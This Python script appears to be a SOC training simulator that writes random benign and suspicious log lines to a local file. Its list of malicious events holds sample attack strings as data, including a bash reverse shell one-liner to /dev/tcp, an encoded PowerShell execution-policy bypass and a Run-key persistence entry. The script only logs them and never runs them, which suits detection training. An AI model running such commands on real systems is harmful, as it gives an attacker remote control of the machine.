import time
import random
from datetime import datetime
import os

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'simulated_logs.txt')
MAX_LOG_SIZE = 500 * 1024

IPS =["192.168.1.45", "10.0.0.12", "185.15.59.222", "198.51.100.23", "203.0.113.44", "8.8.8.8"]
ENDPOINTS =["WIN-DC01", "HR-LAPTOP", "FINANCE-PC", "WEB-SERVER-01", "DB-PROD-01"]

NORMAL_ACTIONS =[
    "User logged in successfully.", "GET /index.html HTTP/1.1 200 OK",
    "Cron job executed successfully.", "Database backup completed."
]

MALICIOUS_ACTIONS =[
    "Connection refused on port 3389",
    "Failed password for admin from {ip} port 22",
    "Executed: powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA",
    "Registry modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "sudo: 3 incorrect password attempts",
    "Executed: /bin/bash -i >& /dev/tcp/{ip}/8080 0>&1"
]

def check_log_rotation():
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        with open(LOG_FILE, 'w') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] [127.0.0.1] [SYSTEM] Log rotated to save memory.\n")
        print("[*] Log file rotated.")

def generate_log():
    check_log_rotation()
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = random.choice(IPS)
    target = random.choice(ENDPOINTS)
    
    if random.random() > 0.20:
        action = random.choice(NORMAL_ACTIONS)
        level = "INFO"
    else:
        action = random.choice(MALICIOUS_ACTIONS).format(ip=ip)
        level = "WARN"

    log_entry = f"[{timestamp}] [{level}] [{ip}] [{target}] {action}\n"
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)
    print(f"Generated: {log_entry.strip()}")

if __name__ == "__main__":
    print("[*] Starting Hardened SOC Simulator...")
    with open(LOG_FILE, 'w') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] [127.0.0.1] [SYSTEM] SOC Initialized.\n")
    try:
        while True:
            generate_log()
            time.sleep(random.uniform(0.5, 2.5))
    except KeyboardInterrupt:
        print("\n[*] Simulator stopped.")
